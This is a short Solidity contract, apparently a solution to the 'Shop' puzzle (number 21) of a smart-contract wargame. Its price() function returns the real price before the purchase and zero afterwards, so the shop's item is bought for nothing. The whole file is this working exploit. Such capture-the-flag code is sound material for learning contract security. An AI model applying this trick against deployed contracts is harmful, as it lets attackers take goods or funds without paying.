// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {Shop, Buyer} from "@puzzles/21/Shop.sol";

contract ShopAttacker is Buyer {
    Shop public shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function attack() public {
        shop.buy();
    }

    function price() external view returns (uint256) {
        if(shop.isSold() == false) {
            return shop.price();
        }else{
            return 0;
        }
    }
}
